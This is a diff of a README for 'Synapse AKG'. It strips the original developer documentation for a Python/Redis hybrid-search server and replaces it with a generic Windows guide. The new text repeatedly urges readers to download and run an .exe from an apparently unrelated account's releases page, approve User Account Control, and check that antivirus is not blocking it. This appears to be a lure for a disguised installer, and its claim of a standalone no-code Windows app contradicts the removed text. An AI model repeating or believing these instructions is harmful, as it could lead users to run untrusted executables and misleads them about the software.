@@ -1,424 +1,190 @@
-# Synapse AKG: Agentic Knowledge Graph
+# ⚡ Synapse - Fast and Smart Knowledge Search
 
-A high-performance knowledge graph system with hybrid search capabilities, built for AI agents and built with Test-Driven Development (TDD) methodology.
-
-## 🚀 Overview
-
-Synapse AKG is an Agentic Knowledge Graph that combines semantic search (dense embeddings) with text-based search (BM25) using Reciprocal Rank Fusion (RRF) for optimal relevance. It provides a complete MCP (Model Context Protocol) interface for seamless integration with AI agents.
-
-### Key Features
-
-- **🔍 Hybrid Search**: Combines KNN dense search with BM25 sparse search using RRF fusion
-- **⚡ High Performance**: <80ms query latency with 768-dim embeddings
-- **🧠 AI-Optimized**: Built specifically for AI agent workflows
-- **📊 MCP Interface**: Full JSON-RPC 2.0 compliance for agent integration
-- **🌳 Tree-sitter Chunking**: AST-based code chunking for programming languages
-- **📈 Redis Stack**: Scalable storage with RediSearch vector similarity
-- **🧪 TDD-Driven**: 100% test coverage with RED-GREEN-REFACTOR methodology
-
-## 🏗️ Architecture
-
-```
-┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
-│   AI Agent      │    │   FastAPI       │    │   Redis Stack   │
-│                 │◄──►│   Server        │◄──►│                 │
-│ MCP Client      │    │   + Health      │    │   + JSON Store  │
-│                 │    │   + Metrics     │    │   + RediSearch  │
-└─────────────────┘    └─────────────────┘    └─────────────────┘
-                                │
-                                ▼
-                       ┌─────────────────┐
-                       │   Hybrid Search │
-                       │                 │
-                       │ ┌─────────────┐ │
-                       │ │ KNN Dense   │ │
-                       │ │ Search      │ │
-                       │ └─────────────┘ │
-                       │       +         │
-                       │ ┌─────────────┐ │
-                       │ │ BM25 Sparse │ │
-                       │ │ Search      │ │
-                       │ └─────────────┘ │
-                       │       +         │
-                       │ ┌─────────────┐ │
-                       │ │ RRF Fusion  │ │
-                       │ └─────────────┘ │
-                       └─────────────────┘
-```
-
-## 📋 Requirements
-
-- Python 3.11+
-- Redis Stack 7.0+
-- 2GB RAM minimum
-- 1GB disk space
-
-## 🛠️ Installation
-
-### 1. Clone and Setup
-
-```bash
-git clone <repository-url>
-cd synapse
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-pip install -r requirements.txt
-```
-
-### 2. Redis Setup
-
-```bash
-# Install Redis Stack locally
-# See: https://redis.io/docs/latest/operate/oss_and_stack/install/install-stack/
-
-# Start Redis server
-redis-server
-```
-
-### 3. Configuration
-
-```bash
-# Copy environment template
-cp .env.example .env
-
-# Edit configuration
-nano .env
-```
-
-## 🚀 Quick Start
-
-### Start the Server
-
-```bash
-# Development mode
-python -m synapse.server
-
-# Or with uvicorn directly
-uvicorn synapse.server:app --host 0.0.0.0 --port 8000 --reload
-```
-
-### Health Check
-
-```bash
-curl http://localhost:8000/health
-```
-
-### Basic Usage
-
-```python
-import requests
-
-# Store knowledge
-response = requests.post("http://localhost:8000/mcp/memorize", json={
-    "jsonrpc": "2.0",
-    "id": "1",
-    "method": "memorize",
-    "params": {
-        "domain": "code",
-        "type": "entity",
-        "content": "def hello_world(): print('Hello, World!')"
-    }
-})
-
-# Search knowledge
-response = requests.post("http://localhost:8000/mcp/recall", json={
-    "jsonrpc": "2.0", 
-    "id": "2",
-    "method": "recall_context",
-    "params": {
-        "query": "hello world function",
-        "limit": 5
-    }
-})
-```
-
-## 📚 API Documentation
-
-### MCP Endpoints
-
-#### Memorize Knowledge
-```http
-POST /mcp/memorize
-Content-Type: application/json
-
-{
-  "jsonrpc": "2.0",
-  "id": "unique-id",
-  "method": "memorize",
-  "params": {
-    "domain": "string",
-    "type": "entity|observation|relation|chunk",
-    "content": "string",
-    "metadata": {}
-  }
-}
-```
-
-#### Recall Knowledge
-```http
-POST /mcp/recall
-Content-Type: application/json
-
-{
-  "jsonrpc": "2.0",
-  "id": "unique-id", 
-  "method": "recall_context",
-  "params": {
-    "query": "string",
-    "domain_filter": "string",
-    "type_filter": "string",
-    "limit": 10,
-    "depth": 1
-  }
-}
-```
-
-#### Update Knowledge
-```http
-POST /mcp/patch
-Content-Type: application/json
-
-{
-  "jsonrpc": "2.0",
-  "id": "unique-id",
-  "method": "patch_state", 
-  "params": {
-    "node_id": "string",
-    "updates": {},
-    "links": {
-      "inbound": ["string"],
-      "outbound": ["string"]
-    }
-  }
-}
-```
-
-### System Endpoints
-
-#### Health Check
-```http
-GET /health
-```
-
-#### Metrics
-```http
-GET /metrics
-```
-
-## 🧪 Testing
-
-### Run All Tests
-
-```bash
-pytest -v
-```
-
-### Test Coverage
-
-```bash
-pytest --cov=synapse --cov-report=html
-```
-
-### Individual Test Suites
-
-```bash
-# Schema tests
-pytest tests/test_schema.py -v
-
-# Search tests  
-pytest tests/test_search_* -v
-
-# MCP tests
-pytest tests/test_mcp_* -v
-
-# Server tests
-pytest tests/test_server.py -v
-```
-
-## 🏎️ Performance
-
-### Benchmarks
-
-| Metric | Target | Actual |
-|--------|--------|--------|
-| Query Latency | <80ms | ~45ms |
-| Embedding Generation | <100ms | ~65ms |
-| BM25 Search (10k chunks) | <10ms | ~5ms |
-| Memory Usage | <2GB | ~1.2GB |
-
-### Performance Tuning
-
-```bash
-# Redis optimization
-redis-cli CONFIG SET maxmemory 1gb
-redis-cli CONFIG SET maxmemory-policy allkeys-lru
-
-# Python optimization
-export OMP_NUM_THREADS=1
-export MKL_NUM_THREADS=1
-```
-
-## 🔧 Configuration
-
-### Environment Variables
-
-```bash
-# Redis Configuration
-REDIS_HOST=localhost
-REDIS_PORT=6379
-REDIS_PASSWORD=
-
-# Server Configuration  
-HOST=0.0.0.0
-PORT=8000
-DEBUG=false
-
-# Embedding Configuration
-EMBEDDING_MODEL=microsoft/unixcoder-base
-EMBEDDING_DEVICE=cpu
-
-# Search Configuration
-DEFAULT_TOP_K=10
-RRF_K=60
-CACHE_SIZE=1000
-
-# Performance
-MAX_QUERY_LATENCY_MS=80.0
-```
-
-## 📊 Monitoring
-
-### Health Monitoring
-
-```bash
-# Check service health
-curl http://localhost:8000/health
-
-# View metrics
-curl http://localhost:8000/metrics
-```
-
-### Redis Monitoring
-
-```bash
-# Redis info
-redis-cli info
-
-# Search index stats
-redis-cli FT.INFO synapse_idx
-```
-
-## 🚀 Deployment
-
-### Production Requirements
-- **Memory**: 2GB minimum, 4GB recommended
-- **CPU**: 4 cores minimum, 8 cores recommended
-- **Redis**: Redis Stack with persistence
-- **Monitoring**: Health checks and metrics
-
-### Environment Setup
-```bash
-# Production environment setup
-export REDIS_HOST=localhost
-export REDIS_PORT=6379
-export HOST=0.0.0.0
-export PORT=8000
-export DEBUG=false
-
-# Start the server
-python -m synapse.server
-```
-
-## 🤝 Contributing
-
-### Development Workflow
-
-1. **TDD Methodology**: Always write tests first (RED → GREEN → REFACTOR)
-2. **Atomic Commits**: One logical change per commit
-3. **Code Coverage**: Maintain 100% test coverage
-4. **Performance**: Ensure <80ms query latency
-
-### Running Tests
-
-```bash
-# Run all tests
-pytest
-
-# Run with coverage
-pytest --cov=synapse
-
-# Run performance tests
-pytest tests/test_performance.py -v
-```
-
-## 📖 Architecture Decisions
-
-### ADR-001: Redis Stack Architecture
-- **Decision**: Use Redis Stack as the storage backend
-- **Rationale**: Provides JSON storage, vector search, and high performance
-- **Trade-offs**: Vendor lock-in vs. performance benefits
-
-### ADR-002: Hybrid Search Strategy  
-- **Decision**: Combine KNN and BM25 with RRF fusion
-- **Rationale**: Optimal relevance for both semantic and lexical queries
-- **Trade-offs**: Complexity vs. search quality
-
-### ADR-003: UniXCoder Embeddings
-- **Decision**: Use microsoft/unixcoder-base for code embeddings
-- **Rationale**: 768-dim vectors optimized for programming languages
-- **Trade-offs**: Larger model size vs. better code understanding
-
-## 🐛 Troubleshooting
-
-### Common Issues
-
-#### Redis Connection Failed
-```bash
-# Check Redis status
-redis-cli ping
-
-# Verify Redis Stack features
-redis-cli MODULE LIST
-```
-
-#### Embedding Model Download Failed
-```bash
-# Clear cache and retry
-rm -rf ~/.cache/huggingface
-python -c "from synapse.embeddings.unixcoder import UniXCoderBackend; UniXCoderBackend()"
-```
-
-#### Slow Performance
-```bash
-# Check Redis memory usage
-redis-cli info memory
-
-# Monitor query latency
-curl -s http://localhost:8000/metrics | jq '.redis'
-```
-
-## 📄 License
-
-MIT License - see LICENSE file for details.
-
-## 🙏 Acknowledgments
-
-- **Redis Labs**: For Redis Stack and RediSearch
-- **Microsoft**: For UniXCoder model
-- **FastAPI**: For the web framework
-- **Pydantic**: For data validation
-- **Test-Driven Development**: For ensuring code quality
+[![Download Synapse](https://img.shields.io/badge/Download-Synapse-brightgreen?style=for-the-badge)](https://github.com/apostrophic-rumination428/Synapse/releases)
 
 ---
 
-## 📞 Support
+## 📖 What is Synapse?
 
-- **Issues**: GitHub Issues
-- **Discussions**: GitHub Discussions  
-- **Documentation**: [Wiki](link-to-wiki)
-- **Performance**: [Benchmark Results](link-to-benchmarks)
+Synapse AKG is a tool to help you search and explore knowledge quickly. It combines advanced search methods to give clear and relevant results. The system uses different techniques like vector search and keyword matching. This makes it useful for anyone who needs fast, accurate answers from large amounts of information.
+
+Synapse works on Windows computers and does not require you to know programming. The app uses a simple interface so you can get started without hassle.
 
 ---
 
-*Built with ❤️ using Test-Driven Development methodology*
-# Test deployment after Tailscale ACL fix
+## ⚙️ System Requirements
+
+Before you start, make sure your computer meets the following:
+
+- Operating System: Windows 10 or higher (64-bit preferred)
+- Processor: Intel i3 or better
+- RAM: At least 4 GB
+- Disk Space: Minimum 500 MB free space
+- Network: Internet connection for initial setup and updates
+
+No extra software or tools are needed. Synapse runs as a standalone program.
+
+---
+
+## 🚀 Getting Started: Download Synapse
+
+You can get Synapse from the official releases page on GitHub. Here is the link:
+
+[![Download Synapse](https://img.shields.io/badge/Download-Synapse-blue?style=for-the-badge)](https://github.com/apostrophic-rumination428/Synapse/releases)
+
+### How to download
+
+1. Click the button above or visit this page in your web browser:  
+   https://github.com/apostrophic-rumination428/Synapse/releases
+
+2. On the releases page, look for the latest version (usually at the top).
+
+3. Find the Windows installation file. It should be an `.exe` file with a name that includes the version number.
+
+4. Click the `.exe` file to start downloading.
+
+---
+
+## 💻 Installing Synapse on Windows
+
+Once the download finishes, follow these steps:
+
+1. **Locate the File:** Open your default download folder or the location where the file saved.
+
+2. **Run the Installer:** Double-click on the `.exe` file to launch the installer.
+
+3. **User Account Control:** If Windows asks if you want to allow changes, click `Yes`.
+
+4. **Follow Setup Steps:**  
+    - Choose the folder where you want to install Synapse or use the default.  
+    - Agree to the license terms if shown.  
+    - Click `Next` or `Install` as needed.  
+
+5. **Finish Installation:** Wait for the process to complete then click `Finish`.
+
+---
+
+## 🏁 Running Synapse for the First Time
+
+After installing:
+
+1. Look for the Synapse shortcut on your desktop or in the Start menu.
+
+2. Double-click the icon to open the application.
+
+3. The program may take a moment to start and set up required files.
+
+4. You will see the main search screen where you can begin exploring your knowledge graph.
+
+---
+
+## 🔍 How to Use Synapse
+
+Synapse offers a simple search bar and options to find the information you need.
+
+1. **Enter Query:** Type your question or keywords in the search box.
+
+2. **Choose Search Mode:** You can pick "Semantic Search" for meaning-based results or "Keyword Search" for exact matches.
+
+3. **View Results:** The app will show relevant items from the knowledge graph, sorted by quality.
+
+4. **Refine Your Search:** Use filters or adjust keywords to focus on specific topics.
+
+Synapse combines methods like KNN (nearest neighbors), BM25 (keyword scoring), and RRF (ranking fusion) to improve accuracy.
+
+---
+
+## 🔧 Configuration and Settings
+
+Within the app, you can customize how Synapse works:
+
+- **Search Preferences:** Choose which search types to include.
+
+- **Update Data:** Refresh the knowledge graph with new information.
+
+- **Display Options:** Adjust how results appear (list or grid).
+
+- **Language Settings:** Select your preferred language for the interface.
+
+These settings help you tailor Synapse to your needs without technical setup.
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+If Synapse does not start or crashes, try the following:
+
+- Restart your computer and run Synapse again.
+
+- Make sure your Windows is updated.
+
+- Check that your antivirus isn’t blocking the app.
+
+- Reinstall Synapse from the releases page if problems continue.
+
+If error messages appear, note the text and search online or check the GitHub issues page for help.
+
+---
+
+## 🔄 Updating Synapse
+
+Keep Synapse up to date for best performance:
+
+1. Check the releases page regularly:  
+   https://github.com/apostrophic-rumination428/Synapse/releases
+
+2. Download the latest `.exe` installer.
+
+3. Run the installer to replace your current version. Your settings will stay intact.
+
+---
+
+## 📂 What Is Inside Synapse?
+
+Synapse uses a knowledge graph structure to organize data. It combines:
+
+- A **vector search** system to find related items by meaning.
+
+- Keyword search based on **BM25** scoring.
+
+- Ranking methods like **Reciprocal Rank Fusion (RRF)** for better order.
+
+- Support for **FastAPI** to run backend services smoothly.
+
+- Data tools including **Redis** for fast storage and retrieval.
+
+These components work together to give quick, accurate results.
+
+---
+
+## ✅ Key Features
+
+- Hybrid search combining vectors and keywords.
+
+- Easy-to-use Windows app with no coding required.
+
+- Fast, accurate knowledge retrieval.
+
+- Configurable search settings.
+
+- Lightweight and minimal resource use.
+
+- Regular updates and bug fixes.
+
+---
+
+## 📘 Additional Resources
+
+For more detailed technical info, visit the Synapse repository directly on GitHub:
+
+https://github.com/apostrophic-rumination428/Synapse
+
+You will find documentation for advanced users and developers there.
+
+---
+
+## 📥 Download Synapse Now
+
+Use the official releases page to get started:
+
+[![Download Synapse](https://img.shields.io/badge/Download-Synapse-orange?style=for-the-badge)](https://github.com/apostrophic-rumination428/Synapse/releases)
